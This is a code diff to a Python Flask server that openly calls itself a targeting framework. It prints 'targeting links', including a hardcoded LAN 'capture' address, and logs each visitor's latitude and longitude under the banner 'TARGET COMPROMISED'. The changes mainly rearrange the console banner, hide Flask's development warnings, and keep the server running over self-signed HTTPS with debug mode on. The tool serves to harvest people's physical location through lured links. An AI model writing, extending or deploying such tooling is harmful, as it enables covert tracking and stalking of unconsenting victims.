@@ -13,11 +13,11 @@ YELLOW = '\033[93m'
 BOLD = '\033[1m'
 RESET = '\033[0m'
 
-# Track if links have been printed to avoid duplicating them on refresh
-links_printed = False
-
 def show_banner():
-    os.system('clear' if os.name != 'nt' else 'cls')
+    # Only clear the terminal screen during the core application activation sequence
+    if os.environ.get('WERKZEUG_RUN_MAIN') == 'true':
+        os.system('clear' if os.name != 'nt' else 'cls')
+    
     banner = r"""""" + f"""{GREEN}{BOLD}
 ======================================================================
   _______ _____          _____ _  ____  __ ______ _   _  ______          __
@@ -31,18 +31,6 @@ def show_banner():
 ======================================================================{RESET}
     """
     print(banner)
-
-# This hook ensures the link panel stays on-screen during execution
-@app.before_request
-def print_target_links():
-    global links_printed
-    if not links_printed:
-        print(f"\n{GREEN}{BOLD}==========[ TARGETING LINKS ]=========={RESET}")
-        print(f" {CYAN}LOCAL LOOPBACK :{RESET} {YELLOW}https://127.0.0.1:5000{RESET}")
-        print(f" {CYAN}LAN CAPTURE IP :{RESET} {GREEN}{BOLD}https://100.73.179.109:5000{RESET}")
-        print(f"{GREEN}{BOLD}======================================={RESET}")
-        print(f"{CYAN}[*] Awaiting target interaction. Live logs streaming below...{RESET}\n")
-        links_printed = True
 
 @app.route('/')
 def index():
@@ -59,6 +47,7 @@ def update_location():
         latitude = data.get('lat')
         longitude = data.get('lon')
         
+        # Live target telemetry logging
         print(f"\n{GREEN}{BOLD}[🎯] TARGET COMPROMISED - NEW LOCATION CAPTURED!{RESET}")
         print(f"    {CYAN}LATITUDE  :{RESET} {YELLOW}{latitude}{RESET}")
         print(f"    {CYAN}LONGITUDE :{RESET} {YELLOW}{longitude}{RESET}")
@@ -71,23 +60,30 @@ def update_location():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 if __name__ == '__main__':
-    show_banner()
-    
+    # 1. Self-healing block for handling missing certificates
     cert_path = 'cert.pem'
     key_path = 'key.pem'
-    
     if not (os.path.exists(cert_path) and os.path.exists(key_path)):
-        print(f"{YELLOW}[!] Notice: Missing SSL credentials. Executing auto-compilation...{RESET}")
         if os.path.exists('generate_cert.sh'):
             subprocess.run(['bash', 'generate_cert.sh'])
-        
+
+    # 2. Trigger the framework display
+    show_banner()
+    
     if os.path.exists(cert_path) and os.path.exists(key_path):
+        # 3. Print the persistent link target panel right underneath the header banner
         print(f"{CYAN}[*] Initializing SSL/TLS layer with self-signed certificates...{RESET}")
-        print(f"{GREEN}[+] Framework status: ACTIVE and listening for incoming payloads...{RESET}\n")
+        print(f"{GREEN}[+] Framework status: ACTIVE and listening for incoming payloads...{RESET}")
         
-        # Completely disable default Flask banners to give our text control
-        cli = sys.modules['flask.cli']
-        cli.show_server_banner = lambda *x: None 
+        print(f"\n{GREEN}{BOLD}==========[ TARGETING LINKS ]=========={RESET}")
+        print(f" {CYAN}LOCAL LOOPBACK :{RESET} {YELLOW}https://127.0.0.1:5000{RESET}")
+        print(f" {CYAN}LAN CAPTURE IP :{RESET} {GREEN}{BOLD}https://100.73.179.109:5000{RESET}")
+        print(f"{GREEN}{BOLD}======================================={RESET}")
+        print(f"{CYAN}[*] Awaiting target interaction. Live logs will stream below...{RESET}\n")
+        
+        # Fully suppress the standard development warning headers to maintain UI consistency
+        import flask.cli
+        flask.cli.show_server_banner = lambda *x: None 
         
         app.run(
             host='0.0.0.0', 
@@ -95,6 +91,4 @@ if __name__ == '__main__':
             debug=True, 
             ssl_context=(cert_path, key_path)
         )
-    else:
-        print(f"{RED}{BOLD}[-] CRITICAL FAILURE: SSL layer negotiation aborted.{RESET}")
         
